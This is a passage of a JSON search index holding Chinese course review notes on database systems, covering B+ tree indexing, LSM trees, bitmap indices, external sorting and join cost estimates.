<li> <p>\u9700\u8981\u9632\u6b62\u5e76\u53d1\u7684move/reorganize\u64cd\u4f5c\uff0c\u4ee5\u53ca\u5728move/reorganize\u64cd\u4f5c\u671f\u95f4\u7684\u8bfb</p> </li> <li>reader\u9700\u8981shared lock, update \u9700\u8981 exclusive lock</li> <li>\u200b\u200b</li> <li>\u200d</li> </ul> <p>\u66ff\u6362\u7b56\u7565</p> <p>LRU\u662f\u4e00\u4e2a\u5e38\u7528\u7684\u66ff\u6362\u7b56\u7565\uff0c\u5728\u4e00\u4e2awell-defined access pattern \u6bd4\u5982\u987a\u5e8f\u626b\u63cf\u4e2d\u8868\u73b0\u826f\u597d\uff0c\u5728\u4e00\u4e9b\u7279\u5b9a\u7684\u5b58\u5728repeated scans \u7684 access pattern\uff0c\u53ef\u80fd\u8868\u73b0\u4e0d\u597d</p> <ul> <li>Toss-immediate strategy</li> <li>MRU strategy</li> <li>Clock \u5bf9LRU\u7684\u4e00\u79cd\u6a21\u62df</li> </ul> <p>Column-Oriented Storage</p> <ul> <li>\u4f18\u52bf</li> <li>\u52a3\u52bf</li> </ul> <p>buffer tree</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#45","title":"4.5 \u6309\u5217\u5b58\u50a8","text":"<p>Store each attribute of a relation separately</p> <p>\u200b\u200b</p> <p>\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u5229\u4e8e\u90e8\u5206\u5c5e\u6027\u7684\u67e5\u8be2\uff0ccache\u548ccompression\uff0c\u7f3a\u9677\u5728\u4e8edeletion, update and reconstruction</p> <ul> <li>\u5217\u5b58\u50a8\u66f4\u5229\u4e8e decision support</li> <li>\u884c\u5b58\u50a8\u66f4\u5229\u4e8e transaction process</li> </ul> <p>Some databases support both representations Called hybrid row/column stores</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#5-indexing","title":"5. indexing","text":""},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#51","title":"5.1 \u4e00\u4e9b\u57fa\u7840\u7684\u6982\u5ff5","text":"<p>indexing mechanism used to speed up access to desired data</p> <ul> <li>search key \u7528\u4e8e\u67e5\u627e\u8bb0\u5f55\u7684\u5c5e\u6027\u96c6</li> <li>index file \u5b58\u50a8\u7740\u4e00\u7cfb\u5217\u5f62\u5982search key - pointer \u7684\u8bb0\u5f55\uff0c\u5176\u4e00\u822c\u90fd\u8fdc\u5c0f\u4e8e\u539f\u6587\u4ef6</li> <li> <p>\u4e00\u822c\u6709\u4e24\u79cd\u7d22\u5f15\u5f62\u5f0f</p> </li> <li> <p>ordered indices\u662f\u6307search key\u4ee5sorted order\u88ab\u5b58\u50a8</p> </li> <li>Hash indices\u662f\u6307search key\u4f7f\u7528hash function\u5747\u5300\u5b58\u5728bucket\u91cc</li> <li>\u6709\u4e00\u7cfb\u5217\u7684\u8bc4\u4ef7\u6307\u6807</li> <li>\u200b\u200b</li> </ul>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#52-ordered-indices","title":"5.2 Ordered Indices","text":"<p>\u987a\u5e8f\u7d22\u5f15\u6309\u7167\u67d0\u79cd\u6807\u51c6\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b</p> <ul> <li>primary index \u53c8\u53ebclustering index\uff0c\u662f\u6307\u88ab\u7d22\u5f15\u7684\u8bb0\u5f55\u672c\u8eab\u5c31\u6309\u7167\u67d0\u4e2asearch key\u987a\u5e8f\u5b58\u50a8\uff0c\u867d\u8bf4\u53ebprimary key\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u5e76\u4e0d\u4e00\u5b9a\u6309\u7167primary key\uff0c\u7528\u4efb\u610f\u4e00\u4e2akey\u5747\u53ef\uff0c\u4e00\u822c\u662fprimary key</li> <li>secondary key \u53c8\u53ebnonclustering index\uff0c\u4e0e\u4e0a\u8ff0\u6982\u5ff5\u76f8\u5bf9\uff0c\u672c\u8eab\u4e0d\u6309\u7167\u8be5key\u6392\u5e8f</li> </ul> <p>index-sequential file\u662f\u6307\u5b58\u5728primary key\u7684\u6587\u4ef6</p> <p>\u200b\u200b\u200b</p> <p>\u200d</p> <p>index entry \u6216\u8005\u53eb index record\uff0c\u662f\u6307\u4e00\u4e2asearch key - pointer \u5bf9</p> <ul> <li>Dense index file \u6587\u4ef6\u4e2d\u7684\u6bcf\u4e00\u4e2asearch key\u90fd\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684index entry\uff0c\u552f\u4e00\u7684\u4f8b\u5916\u662f\u5f53\u8fd9\u4e2a\u6587\u4ef6\u662findex-sequential file/clustering index\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u8ba9index entry\u6307\u5411\u76f8\u540c\u7684search keys\u7684\u7b2c\u4e00\u4e2a</li> <li>Sparse index \u53ea\u4e3a\u641c\u7d22\u7801\u7684\u67d0\u4e9b\u503c\u5efa\u7acb\u7d22\u5f15\uff0c\u6b64\u65f6\u5fc5\u987b\u662fclustering index\uff0c\u987a\u7740\u8fd9\u4e2a\u7d22\u5f15\u627e\uff0c\u53ef\u4ee5\u786e\u5b9a\u4e00\u5b9a\u8303\u56f4\u5185\u7684\u6570\u636e\uff0c\u7a00\u758f\u7d22\u5f15+\u6392\u5e8f\u7684\u52a0\u901f</li> </ul> <p>\u7a00\u758f\u7d22\u5f15\u7684space\u548cmaintenance\u5f00\u9500\u66f4\u5c0f\uff0c\u4f46\u662f\u67e5\u627e\u66f4\u6162</p> <p>Good tradeoff: sparse index with an index entry for every block in file,corresponding to least search-key value in the block.</p> <p>multilevel index</p> <p>\u6211\u4eec\u63d0\u51fa\u8981\u5efa\u7acbprimary index\uff0c\u4f46\u662f\u968f\u7740table\u7684\u53d8\u5927\uff0c\u6211\u4eec\u7684primary index\u4e5f\u4f1a\u968f\u4e4b\u53d8\u5927\uff0c\u76f4\u5230\u4e0d\u80fd\u518d\u653e\u5230\u5185\u5b58\u91cc\uff0c\u8fd9\u6837primary index\u7684\u4f7f\u7528\u5c31\u53d8\u5f97\u9ebb\u70e6\u4e86\uff0c\u4e00\u4e2a\u5f88\u597d\u7684\u89e3\u51b3\u65b9\u6cd5\u5c31\u662f\u7ed9primary index\u5206\u6bb5\u5efa\u7acbsparse index</p> <p>\u200b\u200b</p> <p>\u5f53outer index\u4e5f\u8fc7\u5927\u7684\u65f6\u5019\uff0c\u5c31\u518d\u5728\u5176\u4e0a\u5efa\u7acb\u4e00\u5c42index\uff0c\u4e8e\u662f\u6211\u4eec\u6709\u4e86\u591a\u5c42\u7d22\u5f15</p> <p>\u200d</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#53-b-tree-index","title":"5.3 B+ tree index","text":"<p>B+\u6811\u7d22\u5f15\u6587\u4ef6\u662f\u5bf9indexed-sequential files\u7684\u4e00\u79cd\u4f18\u5316\uff0c\u867d\u7136\u76f8\u5bf9\u7a0d\u5fae\u63d0\u9ad8\u4e86\u4e00\u4e9binsertion\u548cdeletion\u7684\u5f00\u9500\uff0c\u4f46\u662fbp\u6811\u7d22\u5f15\u7684\u4f18\u70b9\u66f4\u5927\uff0c\u56e0\u6b64\u88ab\u5e7f\u6cdb\u4f7f\u7528</p> <p>bp\u6811\u662f\u4e00\u79cd\u591a\u7ea7\u7d22\u5f15\uff0c\u5176\u6709\u4ee5\u4e0b\u7279\u6027</p> <p>N\u4e2a\u6307\u9488\uff0cN-1\u4e2akey</p> <ul> <li>All paths from root to leaf has same length</li> <li>\u975e\u6839\u975e\u53f6\u7684\u5185\u90e8\u8282\u70b9\uff0c\u6709\\(\\lceil n/2\\rceil -n\\) \u4e2achildren</li> <li>\u53f6\u5b50\u8282\u70b9\uff0c\u6709\\(\\lceil(n-1)/2\\rceil - (n-1)\\)\u4e2avalues</li> <li> <p>root \u8282\u70b9</p> </li> <li> <p>\u4e0d\u662f\u53f6\u5b50\uff0c\u6700\u5c11\u4e24\u4e2achildren</p> </li> <li>\u662f\u53f6\u5b50\uff0c0 - (n-1) \u4e2avalues</li> </ul> <p>\u200b\u200b</p> <p>\u53f6\u5b50\u8282\u70b9</p> <p>\u200b\u200b</p> <p>bp\u6811\u7d22\u5f15\u7684\u4e00\u4e9b\u7279\u6027</p> <ul> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li> <p>insertion\uff0c\u5982\u679c\u80fd\u6b63\u5e38\u63d2\u5165\u5219\u63d2\u5165\uff0c\u53cd\u4e4b\u4fbf\u8981\u5206\u88c2</p> </li> <li> <p>\u5206\u88c2\u7684\u65b9\u6cd5\uff0c\u5c06\u7b2c\\(0-\\lceil n/2\\rceil\\) \u4e2a\u5143\u7d20\u653e\u5728\u539f\u59cb\u7684node\uff0c\u5269\u4f59\u7684\u5143\u7d20\u653e\u5230\u65b0\u7684node\uff0c\u5e76\u4e14\u5c06\u6700\u5c0f\u7684key\u548c\u81ea\u8eab\u7684\u5730\u5740p\u53d1\u9001\u5230\u7236\u8282\u70b9</p> </li> <li> <p>deletion \u53ef\u80fd\u9700\u8981\u8c03\u6574\u7ed3\u6784</p> </li> <li> <p>Merge\uff1a\u5982\u679c\u5144\u5f1f\u8282\u70b9\u7684\u5143\u7d20\u6570\u4e4b\u548c\u53ef\u4ee5\u5bb9\u7eb3\u5728\u4e00\u4e2anode\u91cc\u9762\uff0c\u5c31\u5408\u5e76\uff0c\u4e00\u822c\u662f\u5411\u53f3\u8fb9\u627e\u5144\u5f1f\u8282\u70b9\u5148\uff0c\u7136\u540e\u5c06\u53f3\u8fb9\u7684\u5144\u5f1f\u5408\u5e76\u5230\u5de6\u8fb9\uff0c\u5220\u9664\u53f3\u8fb9\u8282\u70b9</p> </li> <li>Redistribute\uff1a\u5982\u679c\u4e0d\u80fd\u5bb9\u7eb3\uff0c\u5c31\u8c03\u6574\u5176\u548c\u5144\u5f1f\u8282\u70b9\u4e4b\u95f4\u7684\u5143\u7d20\u6570\uff0c\u5e76\u4e14\u5728\u7236\u4eb2\u7ed3\u70b9\u91cc\u8c03\u6574\u6307\u9488</li> <li>deletion may cascade upwards</li> <li>\u5982\u679croot node\u88ab\u5220\u9664\u5230\u4e86\u53ea\u6709\u4e00\u4e2apointer\uff0c\u90a3\u4e48\u5176\u5c06\u88ab\u5220\u9664\uff0c\u5e76\u4e14\u5176\u552f\u4e00\u7684child\u5c06\u6210\u4e3a\u65b0\u7684root</li> <li>\u200b\u200b</li> <li>\u800c\u5728\u5b9e\u9645\u60c5\u51b5\u4e0bIO\u4f1a\u66f4\u5c11\uff0c\u56e0\u4e3anode\u53ef\u80fd\u5728buffer\u4e2d\uff0c\u5e76\u4e14\u5206\u88c2\u548c\u5408\u5e76\u662f\u5c11\u7684</li> </ul> <p>non-unique search key</p> <p>\u5982\u679csearch-key\u5b58\u5728\u91cd\u590d\u73b0\u8c61\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e9b\u989d\u5916\u7684\u5904\u7406\u624b\u6bb5\uff0c\u6bd4\u5982</p> <ul> <li>\u521b\u5efacomposite key \u5c06\u8be5key\u548c\u4e00\u4e9b\u5176\u4ed6\u7684key\u653e\u5728\u4e00\u5757\u4f5c\u4e3asearch key\uff0c\u8fbe\u5230unique\u7684\u6548\u679c\uff0c\u4e00\u822c\u548cprimary key\u5462\uff0c\u53ef\u4ee5\u5f62\u6210\u4e00\u79cdrange search\u7684\u6548\u679c</li> <li> <p>\u200b\u200b</p> </li> <li> <p>\u4f30\u8ba1bp\u6811\u7684size</p> </li> </ul> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#54-other-issues-in-indexing","title":"5.4 other issues in indexing","text":"<p>record relocation and secondary indices</p> <p>\u5982\u679c\u4e00\u4e2a\u8868\u6709\u591a\u4e2a\u5c5e\u6027\uff0c\u5e76\u4e14\u8fd9\u4e9b\u5c5e\u6027\u4e0a\u9762\u90fd\u5efa\u7acb\u4e86bp\u6811\uff0c\u5982\u679c\u5220\u9664record\u5c31\u9700\u8981\u66f4\u65b0\u5f88\u591a\uff0c\u89e3\u51b3\u65b9\u6cd5\u662f\u53ef\u4ee5\u8ba9secondary index\u7684\u53f6\u5b50\u8282\u70b9\u5b58primary key\u7684\u503c</p> <p>indexing strings</p> <p>\u662f\u6307\u90a3\u4e9bsearch key\u662f\u53ef\u53d8\u957f\u5ea6\u7684\uff0c\u6bd4\u5982string\u4e2d\u7684varchar\uff0c\u56e0\u4e3a\u5982\u679c\u90fd\u53d6\u6700\u5927\u503c\u7684\u65f6\u5019\uff0c\u4f1a\u5bfc\u81f4bp\u6811\u5206\u652f\u53d8\u5c11\uff0c\u4ece\u800c\u5bfc\u81f4\u6548\u7387\u4e0b\u964d\uff0c\u56e0\u6b64\u6211\u4eec\u4f1a\u5728\u8fd9\u91cc\u4f7f\u7528prefix compression</p> <ul> <li>use space utilization as criterion for splitting \u5c06\u7a7a\u95f4\u5229\u7528\u7387\u4f5c\u4e3a\u5206\u88c2\u7684\u6807\u51c6</li> <li>\u52a8\u6001\u7684fanout, fanout\u5c31\u662fN</li> </ul> <p>\u7c7b\u4f3c\u4e8ehuffman tree\uff0c\u53ea\u8981\u80fd\u505a\u533a\u5206\u7684\u6700\u5c11bit</p> <p>bulk loading and bottom-up build</p> <p>\u5927\u91cf\u6570\u636e\u63d2\u5165\u7684\u4f18\u5316</p> <p>bulk loading \u6279\u91cf\u63d2\u5165</p> <ul> <li>insert in sorted order</li> <li> <p>bottom-up B+ tree construction</p> </li> <li> <p>\u6bcf\u4e2a\u53f6\u5b50\u8282\u70b9\u90fd\u63d2\u6ee1\uff0c\u6700\u540e\u4e24\u4e2a\u9700\u8981\u8c03\u8282\u4e00\u4e0b\uff0c\u505a\u5230\u534a\u6ee1\u5373\u53ef</p> </li> <li>\u200b\u200b</li> <li>\u9996\u5148\u6392\u5e8f</li> <li>\u6784\u5efa</li> <li>the built B+ tree is written to disk using sequential IO operations(\u63d0\u9ad8\u540e\u7eed\u8bbf\u95ee\u7684\u6548\u7387) \u53f6\u5b50page\u90fd\u987a\u5e8f\u653e\u5728\u4e0e\u4e00\u8d77</li> <li>\u5bf9\u4e8e\u4e0a\u8ff0\u4f8b\u5b50\uff0c1seek+9 block transfers \u5c31\u5b8c\u6210\u4e86\u751f\u6210</li> <li> <p>\u4e0a\u8ff0\u7684\u60c5\u51b5\u662fB+\u6811\u751f\u6210\u7684\u7ed3\u679c\uff0c\u5982\u679c\u662f\u5df2\u7ecf\u6709B+\u6811\uff0c\u540c\u65f6\u8981\u63d2\u5165\u5927\u91cf\u6570\u636e\u5462</p> </li> <li> <p>\u65b0\u5efa\u4e00\u4e2aB+ tree \u5408\u5e76\uff0c\u5f62\u4f3c\u628a\u53f6\u5b50\u8282\u70b9\u5f52\u6392\u5e8f</p> </li> <li>2seeks + 19 block transfers</li> <li>\u200b\u200b</li> </ul> <p>multiple-key access</p> <p>\u6709\u4e24\u4e2a\u5143\u7d20\u7684\u7b5b\u9009</p> <ul> <li>A B\u90fd\u65e0\u7d22\u5f15\uff0c\u626b\u63cf</li> <li>A \u6709 B \u65e0\uff0c\u53d6A\uff0c\u626b\u63cfB</li> <li>A B\u90fd\u6709 \u53d6\u5e76\u96c6\u5408</li> </ul> <p>\u6216\u8005\u662f\u5efa\u7acb composite search key (a,b) (a,b)</p> <p>indexing in main memory</p> <p>B+ tree with small nodes that fit in cache line are preferable to reduce cache misses\uff0c\u8fd9\u79cd\u505a\u6cd5\u79f0\u4e3a cache conscious</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#55-write-optimized","title":"5.5 Write Optimized","text":"<p>\u200b\u200b</p> <p>flash\u4e0a\u7684\u7d22\u5f15\u6700\u597d\u80fd\u7528Write-optimized tree structures\uff0c\u5bf9\u4e8e\u5199\u9891\u7e41\u7684disk\u4e5f\u9002\u7528\uff0c\u8fd9\u91cc\u4ecb\u7ecd\u4e24\u79cd</p> <ul> <li>LSM tree</li> <li>buffer tree</li> </ul> <p>log structured merge tree LSM</p> <p>\u200b\u200b</p> <p>\u73b0\u5728\u5185\u5b58\u91cc\u5efa\u7acb\u7d22\u5f15\u7ed3\u6784\uff0c\u8bbe\u5b9a\u4e00\u4e2a\u4e0a\u9650\uff0c\u8fbe\u5230\u4e0a\u9650\u540e\u5199\u5165\u78c1\u76d8\uff0c\u53d8\u4e3a1\u7ea7B+ tree\uff0c\u81ea\u5e95\u5411\u4e0a\uff0c\u4e0d\u65ad\u5730\u52a0\u51651\u7ea7\uff0c\u7136\u540emerge</p> <p>\u663e\u7136\u5404\u7ea7\u7684B+ tree\u90fd\u6709\u4e00\u4e2a\u4e0a\u9650\uff0c\u8d85\u51fa\u4e0a\u9650\u4e4b\u540e\u5c31merge\u5230\u4e0b\u4e00\u5c42</p> <p>\u4e00\u822cLi+1\u4f1a\u6bd4Li\u5927k\u500d</p> <p>\u66f4\u4f18\u5316\u4e00\u70b9\uff0c\u5bf9\u6bcf\u5c42\u90fd\u5b89\u6392\u591a\u4e2aB+ tree\uff0c\u76f4\u63a5\u628a\u6bcf\u5c42\u7684merge\u90fd\u5199\u5165\u4e0b\u4e00\u5c42</p> <p>\u200b\u200b</p> <p>\u5982\u679c\u8981\u67e5\u627e\uff0c\u8981\u5bf9\u6240\u6709\u7684B+ tree\u90fdsearch\uff0c\u5bf9\u4e8elookup\u4e5f\u6709\u4f18\u5316\uff0cBloom filter</p> <p>\u901a\u8fc7\u4e00\u4e2aBloom filter\uff0c\u53ef\u4ee5\u5feb\u901f\u5224\u65ad\u4e00\u4e2a\u503c\u662f\u5426\u5728\u8fd9\u4e2aB+tree\u4e0a\uff0c\u867d\u7136\u5224\u65ad\u6210\u529f\u4e5f\u4e0d\u4e00\u5b9a\u5728\uff0cbloom filter\u662f\u4e00\u4e2abit\u6570\u7ec4\uff0c\u6709\u4e00\u4e2a hash \u51fd\u6570\uff0chash\u51fd\u6570\u7684\u8f93\u51fa\u4f4d\u6570\u548cbit\u6570\u7ec4\u7684\u4f4d\u6570\u4e00\u6837\uff0c\u5c06B+tree\u7684search key\u8303\u56f4\u5185\u7684\u6570\u5b57\u5168\u505a\u4e00\u904dhash\uff0c\u5c06\u5176\u4e2d\u4e3a1\u7684\u4f4d\u6570\uff0c\u76f8\u5e94\u7684bloom filter\u7684\u4f4d\u6570\u4e5f\u7f6e1\uff0c\u5df2\u7ecf\u4e3a1\u5c31\u4e0d\u6539\u4e86</p> <p>\u6b64\u65f6\u6765\u4e86\u4e00\u4e2asearch key\uff0c\u5982\u679c\u5176hash\u4e4b\u540e\u7684\u503c\u6709\u4e00\u4e2a1\u843d\u5728\u4e860\u4e0a\uff0c\u5fc5\u7136\u5c31\u4e0d\u5728\u8fd9\u4e2aB+\u6811\u4e0a</p> <p>\u5982\u679c\u8981\u5220\u9664\uff0c\u90a3\u4e48\u4e00\u822c\u5c31\u662f\u6253\u4e0adelete entries\uff0c\u5728merge\u7684\u65f6\u5019\u5b9e\u9645\u4f24\u5904</p> <p>buffer Tree</p> <p>\u6211\u5bf9\u4e8e\u4e2d\u95f4\u8282\u70b9\u505a\u4e00\u4e2a\u4f18\u5316\uff0c\u6bcf\u4e2a\u4e2d\u95f4\u8282\u70b9\u4f1a\u5206\u914d\u4e00\u70b9\u7a7a\u95f4\u7528\u6765\u505abuffer</p> <p>\u200b\u200b</p> <p>\u63d2\u5165\u7684\u65f6\u5019\u5148\u59d1\u4e14\u63d2\u5728\u5185\u90e8\u8282\u70b9\u7684\u8fd9\u4e2abuffer\u91cc\u9762\uff0c\u5f53buffer\u6ee1\u7684\u65f6\u5019\u518d\u5411\u4e0b\u9762\u63d2\uff0c\u5982\u679c\u4e0b\u9762\u7684buffer\u6709\u7a7a\u5c31\u63d2\u5728\u4e0b\u9762\uff0c\u76f4\u5230\u4e22\u5230leaf\u91cc\u9762</p> <p>\u56e0\u4e3a\u5185\u90e8\u8282\u70b9\u5728buffer\u91cc\u7684\u6982\u7387\u66f4\u5927\uff0c\u8fd9\u4e48\u505a\u6709\u5229\u4e8e\u51cf\u5c11IO\uff0c\u5199\u4f18\u5316</p> <p>\u7f3a\u9677</p> <p>fanout\u5c11\u4e86\uff0c\u6811\u7684\u7ed3\u6784\u53d8\u5f97\u4e0d\u592a\u4f18\u4e86</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#56-bitmap-index","title":"5.6 bitmap index*","text":"<p>bitmap indices are a special type of index designed fro efficient querying on multuple keys</p> <p>\u9002\u7528\u4e8e\u90a3\u4e9b\u53d6\u503c\u5b58\u5728\u79bb\u6563\u7684\u6709\u9650\u8303\u56f4\u7684\u5c5e\u6027\uff0c\u6bd4\u5982\u6027\u522b\uff0c\u56fd\u5bb6\u7b49\u7b49</p> <p>\u4ed6\u4f1a\u5bf9\u53d6\u503c\u7684\u8303\u56f4\u5efa\u7acb\u4e00\u4e2abit\u6570\u7ec4</p> <p>\u200b\u200b</p> <p>100w\u4e2abits\u5982\u4f55\u7edf\u8ba1\u6709\u591a\u5c11\u4e2a1,100w\u4e2abit\uff0c\u53ef\u4ee5\u8003\u8651\u5206\u6210\u4e00\u5806bytes\uff0c\u7136\u540e\u5efa\u7acbbytes\u503c\u548c1\u6570\u91cf\u7684\u6620\u5c04\uff0c\u8fdb\u884c\u5faa\u73af\u7edf\u8ba1</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#6-query-processing","title":"6. Query Processing","text":""},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#61-basic-steps","title":"6.1 basic steps","text":"<ul> <li>Parsing and translation \u8bed\u6cd5\u5206\u6790\u548c\u7ffb\u8bd1</li> <li>optimization</li> <li>evaluation</li> </ul> <p>An evaluation plan defines exactly what algorithm is used for each operation, and how the execution of the operations is coordinated.</p> <p>\u5bf9\u4e8eQuery\u800c\u8a00\uff0c\u6700\u5e38\u89c1\u7684\u8861\u91cf\u65b9\u6cd5\u662f\uff0c\u66f4\u5173\u6ce8response time</p> <ul> <li>the number of block transfers from disk \u4f20\u8f93\u7684\u65f6\u95f4</li> <li>the number of seeks \u641c\u7d22\u7684\u65f6\u95f4\uff0c\u53ea\u6709\u4e0d\u8fde\u7eed\u7684\u65f6\u5019\u9700\u8981\u7528\u5230</li> </ul> <p>\u7531\u4e8ebuffer\u7684\u4f7f\u7528\u53ea\u6709\u8fd0\u884c\u65f6\u624d\u80fd\u8861\u91cf\uff0c\u6240\u4ee5\u6211\u4eec\u4e00\u822c\u5c31\u4f7f\u7528worst case estimates</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#62-selection","title":"6.2 Selection","text":"<p>10\u79cd</p> <p>scan</p> <ul> <li>File Scan</li> <li>Index Scan</li> </ul> <p>selection</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#63-sort","title":"6.3 Sort*","text":"<p>\u5916\u6392\u5e8f</p> <p>M\u8868\u793a\u5185\u5b58\u7684\u5927\u5c0f\uff0cbr\u8868\u793a\u5173\u7cfbr\u4e2d\u7684block\u7684\u6570\u91cf\uff0c\u5bf9\u4e8eN-way merge\uff0c\u662f\u6307\u4e00\u6b21\u5f52\u5e76N\u4e2ablock</p> <ul> <li> <p>\u5982\u679cN&lt;M \u4e00\u6b21\u5b8c\u6210</p> </li> <li> <p>\u7528N\u4e2ablock\u4f5c\u4e3ainput\uff0c\u7528\u4e00\u4e2ablock\u4f5c\u4e3a\u8f93\u51fa\uff0c\u4e0d\u65ad\u505a\u5f52\u5e76\u6392\u5e8f\uff0c\u5f53\u8f93\u51fablock\u6ee1\u4e86\u5c31\u5199\u5165\u78c1\u76d8</p> </li> <li> <p>\u5982\u679cN&gt;=M</p> </li> <li> <p>\u6bcf\u4e2apass\u653eM-1\u4e2a</p> </li> </ul> <p>\u5bf9\u4e8e\u4e00\u6b21\u5f52\u5e76\u6392\u5e8f\u800c\u8a00</p> <ul> <li>\u6bcf\u6b21\u9700\u89812br\u4e2a\u6570\u636e\u4f20\u8f93</li> <li>\u6bcf\u6b21\u4f7f\u5f97\u9700\u8981\u5f52\u5e76\u7684\u6bb5\u6570\u964d\u4e3a1/(M-1)\u6240\u4ee5\u603b\u5f97\u5f52\u5e76\u6b21\u6570\u4e3a\\(\\lceil\\log_{M-1}(b_r/M)\\rceil\\)</li> <li> <p>\u6700\u540e\u4e00\u8d9f\u53ea\u9700\u8981\u4e00\u4e2abr\u7684\u6570\u636e\u4f20\u8f93\uff0c\u56e0\u4e3a\u7ed3\u679c\u53ef\u4ee5\u4e0d\u5199\u56de\u78c1\u76d8\uff0c\u603b\u5f97\u6570\u636e\u4f20\u8f93\u6b21\u6570\u4e3a\u200b</p> </li> <li> <p>\u78c1\u76d8\u641c\u7d22\u6b21\u6570\u4e3a\uff0c\u5176\u4e2d\\(b_b\\)\u4e3a\u7f13\u51b2\u5757\u6570   \u200b\u200b</p> </li> </ul> <p>PPT\u4e0a\u7ed9\u4e86\u4e00\u4e2a\u590d\u6742\u7248\u672c\u548c\u7b80\u5355\u7248\u672c P25</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#64-join-hash-join-a4","title":"6.4 Join* hash join A4","text":"<p>5\u79cdjoin\u7b97\u6cd5</p> <ul> <li> <p>Nested-Loop Join:</p> </li> <li> <p>\u200b\u200b</p> </li> <li>\u5176\u4e2dr\u662f\u5916\u90e8\u5173\u7cfb\uff0cs\u662f\u5185\u90e8\u5173\u7cfb\uff0cnr\u662fr\u5185\u90e8\u7684\u5143\u7ec4\u6570\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u6bcf\u4e2ar\u4e2d\u5143\u7ec4\u8bfb\u53d6\u4e00\u6b21s\u4e2d\u6240\u6709\u7684block\uff0c\u53ef\u4ee5\u63a8\u51fablock transfer</li> <li>block transfer: \\(n_r*b_s+b_r\\)</li> <li>seeks\uff1a\\(n_r+b_r\\)</li> <li>\u5982\u679c\u5176\u4e2d\u4e00\u4e2a\u5173\u7cfb\u80fd\u5b8c\u5168\u653e\u5165\u78c1\u76d8\u4e2d\uff0c\u90a3\u4e48\u5c06\u5176\u4f5c\u4e3a\u5185\u5c42\u5173\u7cfb\uff0c\u6211\u4eec\u53ef\u4ee5\u63a8\u51fa\u53ea\u9700\u8981br+bsblock transfer\u548c2\u4e2aseeks</li> <li> <p>Block Nested-Loop Join</p> </li> <li> <p>block transfer \\(b_r*b_s +b_r\\)</p> </li> <li>seeks \\(2b_r\\)</li> <li>\u200b\u200b</li> <li> <p>indexed nested-Loop 